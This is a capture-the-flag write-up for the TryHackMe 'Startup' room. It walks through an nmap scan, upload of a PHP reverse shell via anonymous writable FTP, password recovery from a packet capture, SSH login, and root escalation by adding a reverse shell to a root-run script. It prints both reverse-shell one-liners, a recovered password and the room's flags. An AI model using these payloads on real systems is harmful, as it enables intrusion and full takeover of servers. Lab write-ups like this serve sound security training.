# TryHackMe Startup Writeup

## Nmap scan

```ruby
nmap -sCV 10.10.246.53
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 10:21 EDT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.77% done; ETC: 10:21 (0:00:00 remaining)
Nmap scan report for 10.10.246.53
Host is up (0.60s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.47.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.60 seconds

```

- **`Ftp`**
- **`ssh`**
- **`http`**

---

## Ftp

```
ftp 10.10.246.53
```

<img width="1268" height="744" alt="image" src="https://github.com/user-attachments/assets/51dd765c-ab3a-4ffc-bbbe-55fad6e2171c" />

<img width="480" height="148" alt="image" src="https://github.com/user-attachments/assets/2ef55cde-a1a0-4953-bb27-4879fbe47a18" />

<img width="1491" height="675" alt="image" src="https://github.com/user-attachments/assets/87c4f200-bbfd-48de-8288-66734a120094" />

## `gobuster`

```ruby
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.106.2 
```

<img width="1135" height="386" alt="image" src="https://github.com/user-attachments/assets/5a903313-b641-4ee4-b30f-443140535d8d" />

```
http://10.10.106.2/files/
```

<img width="645" height="343" alt="image" src="https://github.com/user-attachments/assets/51fa8025-7a55-4f86-bccf-8c85e86392cd" />

> looks it is same content of Ftp

> let's try to put file on **`ftp`** directory to see if it will appear in browser

<img width="1095" height="199" alt="image" src="https://github.com/user-attachments/assets/763031c9-0462-46e6-bd43-81cd1d87ba17" />

<img width="992" height="153" alt="image" src="https://github.com/user-attachments/assets/8967ff6f-b261-432b-9ffe-4fd6e2d1f8fe" />

> ### good now will try to upload php reverseshell

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'");
```

<img width="1121" height="397" alt="image" src="https://github.com/user-attachments/assets/bdd1c8f5-ccc4-4b80-bb84-4dce9cf28094" />

<img width="1359" height="495" alt="image" src="https://github.com/user-attachments/assets/54aa5b74-7f37-4250-86d1-80b03b76879a" />

> ## now the recipe is 

<img width="1265" height="90" alt="image" src="https://github.com/user-attachments/assets/531474f2-2fe9-46d9-bdcd-429a6624abe6" />

> ### found pcapng file

<img width="807" height="89" alt="image" src="https://github.com/user-attachments/assets/60305210-7c82-486c-b38e-28b6f5dbd404" />

> ### send it to my machine

<img width="1181" height="358" alt="image" src="https://github.com/user-attachments/assets/65994de1-2c01-42f6-a1c8-2feae5b4b9a4" />

> ### click on any Tcp packet then **`Follow`** -> **`TCP stream`**

<img width="1874" height="807" alt="image" src="https://github.com/user-attachments/assets/ce26510f-bb10-4e0e-b2e6-2b4b8625cff9" />

```
c4ntg3t3n0ughsp1c3
```

## login to lennie ssh 

```
ssh lennie@10.10.98.196
```

<img width="940" height="510" alt="image" src="https://github.com/user-attachments/assets/0fbf0621-5d62-4b25-8034-01655c7fe5f8" />

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

## using linpeas found

<img width="1293" height="178" alt="image" src="https://github.com/user-attachments/assets/c9361f81-c0c6-45fd-ba3d-537ce2a84c10" />

> ## planner script it own to root i can't edit it but it run another script i can edit it call **`print.sh`** i will edit it and put reveseshell

```
/home/lennie/scripts/startup_list.txt
/home/lennie/scripts/planner.sh

/etc/print.sh
```

```
sh -i >& /dev/tcp/10.8.47.102/4445 0>&1
```

<img width="897" height="218" alt="image" src="https://github.com/user-attachments/assets/dc321dec-babd-47f5-b236-09ec3972d580" />

## wait untill file excuted

<img width="914" height="371" alt="image" src="https://github.com/user-attachments/assets/5a04e69a-08b6-40f4-8dcf-17b07f143999" />

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

